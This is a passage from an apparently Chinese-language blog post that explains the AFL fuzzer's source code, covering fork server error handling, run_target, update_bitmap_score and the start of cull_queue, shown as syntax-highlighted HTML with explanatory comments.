input\n&quot;</span></span><br><span class="line">           <span class="string">&quot;    from the fuzzer! There are several probable explanations:\n\n&quot;</span></span><br><span class="line"></span><br><span class="line">           <span class="string">&quot;    - The current memory limit (%s) is too restrictive, causing the\n&quot;</span></span><br><span class="line">           <span class="string">&quot;      target to hit an OOM condition in the dynamic linker. Try bumping up\n&quot;</span></span><br><span class="line">           <span class="string">&quot;      the limit with the -m setting in the command line. A simple way confirm\n&quot;</span></span><br><span class="line">           <span class="string">&quot;      this diagnosis would be:\n\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> RLIMIT_AS</span></span><br><span class="line">           <span class="string">&quot;      ( ulimit -Sv $[%llu &lt;&lt; 10]; /path/to/fuzzed_app )\n\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">           <span class="string">&quot;      ( ulimit -Sd $[%llu &lt;&lt; 10]; /path/to/fuzzed_app )\n\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* ^RLIMIT_AS */</span></span></span><br><span class="line"></span><br><span class="line">           <span class="string">&quot;      Tip: you can use http://jwilk.net/software/recidivm to quickly\n&quot;</span></span><br><span class="line">           <span class="string">&quot;      estimate the required amount of virtual memory for the binary.\n\n&quot;</span></span><br><span class="line"></span><br><span class="line">           <span class="string">&quot;    - The binary is just buggy and explodes entirely on its own. If so, you\n&quot;</span></span><br><span class="line">           <span class="string">&quot;      need to fix the underlying problem or find a better replacement.\n\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __APPLE__</span></span><br><span class="line"></span><br><span class="line">           <span class="string">&quot;    - On MacOS X, the semantics of fork() syscalls are non-standard and may\n&quot;</span></span><br><span class="line">           <span class="string">&quot;      break afl-fuzz performance optimizations when running platform-specific\n&quot;</span></span><br><span class="line">           <span class="string">&quot;      targets. To fix this, set AFL_NO_FORKSRV=1 in the environment.\n\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* __APPLE__ */</span></span></span><br><span class="line"></span><br><span class="line">           <span class="string">&quot;    - Less likely, there is a horrible bug in the fuzzer. If other options\n&quot;</span></span><br><span class="line">           <span class="string">&quot;      fail, poke &lt;lcamtuf@coredump.cx&gt; for troubleshooting tips.\n&quot;</span>,</span><br><span class="line">           DMS(mem_limit &lt;&lt; <span class="number">20</span>), mem_limit - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    FATAL(<span class="string">&quot;Fork server crashed with signal %d&quot;</span>, WTERMSIG(status));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (*(u32 *)trace_bits == EXEC_FAIL_SIG)</span><br><span class="line">    FATAL(<span class="string">&quot;Unable to execute target application (&#x27;%s&#x27;)&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mem_limit &amp;&amp; mem_limit &lt; <span class="number">500</span> &amp;&amp; uses_asan)</span><br><span class="line">  &#123;</span><br><span class="line"></span><br><span class="line">    SAYF(<span class="string">&quot;\n&quot;</span> cLRD <span class="string">&quot;[-] &quot;</span> cRST</span><br><span class="line">         <span class="string">&quot;Hmm, looks like the target binary terminated before we could complete a\n&quot;</span></span><br><span class="line">         <span class="string">&quot;    handshake with the injected code. Since it seems to be built with ASAN and\n&quot;</span></span><br><span class="line">         <span class="string">&quot;    you have a restrictive memory limit configured, this is expected; please\n&quot;</span></span><br><span class="line">         <span class="string">&quot;    read %s/notes_for_asan.txt for help.\n&quot;</span>,</span><br><span class="line">         doc_path);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (!mem_limit)</span><br><span class="line">  &#123;</span><br><span class="line"></span><br><span class="line">    SAYF(<span class="string">&quot;\n&quot;</span> cLRD <span class="string">&quot;[-] &quot;</span> cRST</span><br><span class="line">         <span class="string">&quot;Hmm, looks like the target binary terminated before we could complete a\n&quot;</span></span><br><span class="line">         <span class="string">&quot;    handshake with the injected code. Perhaps there is a horrible bug in the\n&quot;</span></span><br><span class="line">         <span class="string">&quot;    fuzzer. Poke &lt;lcamtuf@coredump.cx&gt; for troubleshooting tips.\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line"></span><br><span class="line">    SAYF(<span class="string">&quot;\n&quot;</span> cLRD <span class="string">&quot;[-] &quot;</span> cRST</span><br><span class="line">         <span class="string">&quot;Hmm, looks like the target binary terminated before we could complete a\n&quot;</span></span><br><span class="line">         <span class="string">&quot;    handshake with the injected code. There are %s probable explanations:\n\n&quot;</span></span><br><span class="line"></span><br><span class="line">         <span class="string">&quot;%s&quot;</span></span><br><span class="line">         <span class="string">&quot;    - The current memory limit (%s) is too restrictive, causing an OOM\n&quot;</span></span><br><span class="line">         <span class="string">&quot;      fault in the dynamic linker. This can be fixed with the -m option. A\n&quot;</span></span><br><span class="line">         <span class="string">&quot;      simple way to confirm the diagnosis may be:\n\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> RLIMIT_AS</span></span><br><span class="line">         <span class="string">&quot;      ( ulimit -Sv $[%llu &lt;&lt; 10]; /path/to/fuzzed_app )\n\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">         <span class="string">&quot;      ( ulimit -Sd $[%llu &lt;&lt; 10]; /path/to/fuzzed_app )\n\n&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* ^RLIMIT_AS */</span></span></span><br><span class="line"></span><br><span class="line">         <span class="string">&quot;      Tip: you can use http://jwilk.net/software/recidivm to quickly\n&quot;</span></span><br><span class="line">         <span class="string">&quot;      estimate the required amount of virtual memory for the binary.\n\n&quot;</span></span><br><span class="line"></span><br><span class="line">         <span class="string">&quot;    - Less likely, there is a horrible bug in the fuzzer. If other options\n&quot;</span></span><br><span class="line">         <span class="string">&quot;      fail, poke &lt;lcamtuf@coredump.cx&gt; for troubleshooting tips.\n&quot;</span>,</span><br><span class="line">         getenv(DEFER_ENV_VAR) ? <span class="string">&quot;three&quot;</span> : <span class="string">&quot;two&quot;</span>,</span><br><span class="line">         getenv(DEFER_ENV_VAR) ? <span class="string">&quot;    - You are using deferred forkserver, but __AFL_INIT() is never\n&quot;</span></span><br><span class="line">                                 <span class="string">&quot;      reached before the program terminates.\n\n&quot;</span></span><br><span class="line">                               : <span class="string">&quot;&quot;</span>,</span><br><span class="line">         DMS(mem_limit &lt;&lt; <span class="number">20</span>), mem_limit - <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  FATAL(<span class="string">&quot;Fork server handshake failed&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="run-target">run_target</h4><p>用来运行一次目标</p><p>首先初始化了trace_bits，并设置了内存屏障</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> u8 <span class="title function_">run_target</span><span class="params">(<span class="type">char</span> **argv, u32 timeout)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  <span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">itimerval</span> <span class="title">it</span>;</span></span><br><span class="line">  <span class="type">static</span> u32 prev_timed_out = <span class="number">0</span>;</span><br><span class="line">  <span class="type">static</span> u64 exec_ms = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> status = <span class="number">0</span>;</span><br><span class="line">  u32 tb4;</span><br><span class="line"></span><br><span class="line">  child_timed_out = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* After this memset, trace_bits[] are effectively volatile, so we</span></span><br><span class="line"><span class="comment">     must prevent any earlier operations from venturing into that</span></span><br><span class="line"><span class="comment">     territory. */</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(trace_bits, <span class="number">0</span>, MAP_SIZE);</span><br><span class="line">  MEM_BARRIER();</span><br></pre></td></tr></table></figure><p>如果是dump_mode 并且没有forkserver， 就需要先类似init_forkserver 中的部分操作，来创建子进程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> (dumb_mode == <span class="number">1</span> || no_forkserver)</span><br><span class="line">  &#123;</span><br><span class="line"></span><br><span class="line">    child_pid = fork();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (child_pid &lt; <span class="number">0</span>)</span><br><span class="line">      PFATAL(<span class="string">&quot;fork() failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!child_pid)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">rlimit</span> <span class="title">r</span>;</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (mem_limit)</span><br><span class="line">      &#123;</span><br><span class="line"></span><br><span class="line">        r.rlim_max = r.rlim_cur = ((<span class="type">rlim_t</span>)mem_limit) &lt;&lt; <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> RLIMIT_AS</span></span><br><span class="line"></span><br><span class="line">        setrlimit(RLIMIT_AS, &amp;r); <span class="comment">/* Ignore errors */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"></span><br><span class="line">        setrlimit(RLIMIT_DATA, &amp;r); <span class="comment">/* Ignore errors */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* ^RLIMIT_AS */</span></span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      r.rlim_max = r.rlim_cur = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">      setrlimit(RLIMIT_CORE, &amp;r); <span class="comment">/* Ignore errors */</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Isolate the process and configure standard descriptors. If out_file is</span></span><br><span class="line"><span class="comment">         specified, stdin is /dev/null; otherwise, out_fd is cloned instead. */</span></span><br><span class="line"></span><br><span class="line">      setsid();</span><br><span class="line"></span><br><span class="line">      dup2(dev_null_fd, <span class="number">1</span>);</span><br><span class="line">      dup2(dev_null_fd, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (out_file)</span><br><span class="line">      &#123;</span><br><span class="line"></span><br><span class="line">        dup2(dev_null_fd, <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line"></span><br><span class="line">        dup2(out_fd, <span class="number">0</span>);</span><br><span class="line">        close(out_fd);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* On Linux, would be faster to use O_CLOEXEC. Maybe TODO. */</span></span><br><span class="line"></span><br><span class="line">      close(dev_null_fd);</span><br><span class="line">      close(out_dir_fd);</span><br><span class="line">      close(dev_urandom_fd);</span><br><span class="line">      close(fileno(plot_file));</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Set sane defaults for ASAN if nothing else specified. */</span></span><br><span class="line"></span><br><span class="line">      setenv(<span class="string">&quot;ASAN_OPTIONS&quot;</span>, <span class="string">&quot;abort_on_error=1:&quot;</span></span><br><span class="line">                             <span class="string">&quot;detect_leaks=0:&quot;</span></span><br><span class="line">                             <span class="string">&quot;symbolize=0:&quot;</span></span><br><span class="line">                             <span class="string">&quot;allocator_may_return_null=1&quot;</span>,</span><br><span class="line">             <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      setenv(<span class="string">&quot;MSAN_OPTIONS&quot;</span>, <span class="string">&quot;exit_code=&quot;</span> STRINGIFY(MSAN_ERROR) <span class="string">&quot;:&quot;</span></span><br><span class="line">                                                                <span class="string">&quot;symbolize=0:&quot;</span></span><br><span class="line">                                                                <span class="string">&quot;msan_track_origins=0&quot;</span>,</span><br><span class="line">             <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      execv(target_path, argv);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Use a distinctive bitmap value to tell the parent about execv()</span></span><br><span class="line"><span class="comment">         falling through. */</span></span><br><span class="line"></span><br><span class="line">      *(u32 *)trace_bits = EXEC_FAIL_SIG;</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>反之如果在 非dump mode，那么通过控制管道通知子进程运行，并获取其pid</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">else</span></span><br><span class="line"> &#123;</span><br><span class="line"></span><br><span class="line">   s32 res;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* In non-dumb mode, we have the fork server up and running, so simply</span></span><br><span class="line"><span class="comment">      tell it to have at it, and then read back PID. */</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> ((res = write(fsrv_ctl_fd, &amp;prev_timed_out, <span class="number">4</span>)) != <span class="number">4</span>)</span><br><span class="line">   &#123;</span><br><span class="line">    <span class="comment">// 向forkserver发送消息</span></span><br><span class="line">    <span class="keyword">if</span> (stop_soon)</span><br><span class="line">       <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">     RPFATAL(res, <span class="string">&quot;Unable to request new process from fork server (OOM?)&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> ((res = read(fsrv_st_fd, &amp;child_pid, <span class="number">4</span>)) != <span class="number">4</span>)</span><br><span class="line">   &#123;</span><br><span class="line"><span class="comment">// 接受子进程pid</span></span><br><span class="line">     <span class="keyword">if</span> (stop_soon)</span><br><span class="line">       <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">     RPFATAL(res, <span class="string">&quot;Unable to request new process from fork server (OOM?)&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (child_pid &lt;= <span class="number">0</span>)</span><br><span class="line">     FATAL(<span class="string">&quot;Fork server is misbehaving (OOM?)&quot;</span>);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>设置timeout</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">it.it_value.tv_sec = (timeout / <span class="number">1000</span>);</span><br><span class="line">it.it_value.tv_usec = (timeout % <span class="number">1000</span>) * <span class="number">1000</span>;</span><br><span class="line"></span><br><span class="line">setitimer(ITIMER_REAL, &amp;it, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><p>阻塞，等待子进程运行结束</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> (dumb_mode == <span class="number">1</span> || no_forkserver)</span><br><span class="line"> &#123;</span><br><span class="line"><span class="comment">// 如果在dumpmode，通过waitpid阻塞</span></span><br><span class="line">   <span class="keyword">if</span> (waitpid(child_pid, &amp;status, <span class="number">0</span>) &lt;= <span class="number">0</span>)</span><br><span class="line">     PFATAL(<span class="string">&quot;waitpid() failed&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line"> &#123;</span><br><span class="line"></span><br><span class="line">   s32 res;</span><br><span class="line">   <span class="comment">// 如果存在forkserver </span></span><br><span class="line">   <span class="comment">// 通过读管道阻塞</span></span><br><span class="line">   <span class="keyword">if</span> ((res = read(fsrv_st_fd, &amp;status, <span class="number">4</span>)) != <span class="number">4</span>)</span><br><span class="line">   &#123;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> (stop_soon)</span><br><span class="line">       <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">     RPFATAL(res, <span class="string">&quot;Unable to communicate with fork server (OOM?)&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>接下来根据子进程返回的status，进行对应的错误处理</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> (!WIFSTOPPED(status))</span><br><span class="line">    child_pid = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  getitimer(ITIMER_REAL, &amp;it);</span><br><span class="line">  exec_ms = (u64)timeout - (it.it_value.tv_sec * <span class="number">1000</span> +</span><br><span class="line">                            it.it_value.tv_usec / <span class="number">1000</span>);</span><br><span class="line">  <span class="comment">// 计算运行时间</span></span><br><span class="line">  it.it_value.tv_sec = <span class="number">0</span>;</span><br><span class="line">  it.it_value.tv_usec = <span class="number">0</span>;</span><br><span class="line">   </span><br><span class="line">  setitimer(ITIMER_REAL, &amp;it, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  total_execs++;</span><br><span class="line">  <span class="comment">// 总运行次数加一</span></span><br><span class="line">  <span class="comment">/* Any subsequent operations on trace_bits must not be moved by the</span></span><br><span class="line"><span class="comment">     compiler below this point. Past this location, trace_bits[] behave</span></span><br><span class="line"><span class="comment">     very normally and do not have to be treated as volatile. */</span></span><br><span class="line"></span><br><span class="line">  MEM_BARRIER();</span><br><span class="line"></span><br><span class="line">  tb4 = *(u32 *)trace_bits;</span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> WORD_SIZE_64</span></span><br><span class="line">  classify_counts((u64 *)trace_bits);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  classify_counts((u32 *)trace_bits);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* ^WORD_SIZE_64 */</span></span></span><br><span class="line">  </span><br><span class="line">  prev_timed_out = child_timed_out;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Report outcome to caller. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (WIFSIGNALED(status) &amp;&amp; !stop_soon)</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="comment">// 根据信号判断错误类型</span></span><br><span class="line">    kill_signal = WTERMSIG(status);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (child_timed_out &amp;&amp; kill_signal == SIGKILL)</span><br><span class="line">      <span class="keyword">return</span> FAULT_TMOUT;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> FAULT_CRASH;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* A somewhat nasty hack for MSAN, which doesn&#x27;t support abort_on_error and</span></span><br><span class="line"><span class="comment">     must use a special exit code. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (uses_asan &amp;&amp; WEXITSTATUS(status) == MSAN_ERROR)</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="comment">// 根据exitstatus判断错误类型</span></span><br><span class="line">    kill_signal = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> FAULT_CRASH;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((dumb_mode == <span class="number">1</span> || no_forkserver) &amp;&amp; tb4 == EXEC_FAIL_SIG)</span><br><span class="line">    <span class="keyword">return</span> FAULT_ERROR;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* It makes sense to account for the slowest units only if the testcase was run</span></span><br><span class="line"><span class="comment">  under the user defined timeout. */</span></span><br><span class="line">  <span class="keyword">if</span> (!(timeout &gt; exec_tmout) &amp;&amp; (slowest_exec_ms &lt; exec_ms))</span><br><span class="line">  &#123;</span><br><span class="line">    slowest_exec_ms = exec_ms;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 如果顺利运行到最后，说明没有错误</span></span><br><span class="line">  <span class="keyword">return</span> FAULT_NONE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="update-bitmap-score">update_bitmap_score</h4><p>这部分涉及到了AFL维护的一个<code>static struct queue_entry *top_rated[MAP_SIZE]</code><br>数组，这个数组记录了每个bitmap中的一项（也就是每个基本块）对应的最favored的testcase。</p><p>这个favored score由执行时间和长度相乘得到。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">update_bitmap_score</span><span class="params">(<span class="keyword">struct</span> queue_entry *q)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  u32 i;</span><br><span class="line">  u64 fav_factor = q-&gt;exec_us * q-&gt;len;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* For every byte set in trace_bits[], see if there is a previous winner,</span></span><br><span class="line"><span class="comment">     and how it compares to us. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAP_SIZE; i++)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (trace_bits[i])</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (top_rated[i])</span><br><span class="line">      &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Faster-executing or smaller test cases are favored. */</span></span><br><span class="line"><span class="comment">// favored score由执行时间和长度相乘得到。越小越好</span></span><br><span class="line">        <span class="keyword">if</span> (fav_factor &gt; top_rated[i]-&gt;exec_us * top_rated[i]-&gt;len)</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Looks like we&#x27;re going to win. Decrease ref count for the</span></span><br><span class="line"><span class="comment">           previous winner, discard its trace_bits[] if necessary. */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!--top_rated[i]-&gt;tc_ref)</span><br><span class="line">        &#123;</span><br><span class="line">          ck_free(top_rated[i]-&gt;trace_mini);</span><br><span class="line">          top_rated[i]-&gt;trace_mini = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Insert ourselves as the new winner. */</span></span><br><span class="line"></span><br><span class="line">      top_rated[i] = q;</span><br><span class="line">      q-&gt;tc_ref++;</span><br><span class="line">  <span class="comment">// 如果更favored，则更新top_rated数组</span></span><br><span class="line">      <span class="keyword">if</span> (!q-&gt;trace_mini)</span><br><span class="line">      &#123;</span><br><span class="line">        q-&gt;trace_mini = ck_alloc(MAP_SIZE &gt;&gt; <span class="number">3</span>);</span><br><span class="line">        minimize_bits(q-&gt;trace_mini, trace_bits);</span><br><span class="line">        <span class="comment">// 压缩trace_bits为bitmap</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      score_changed = <span class="number">1</span>;</span><br><span class="line">      <span class="comment">// 设置flag为1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="cull-queue-挑选更好的种子">cull_queue | 挑选更好的种子</h3><p>此函数通过标记更favored 的种子，使得favored的种子得到更大的运行概率</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">cull_queue</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">queue_entry</span> *<span 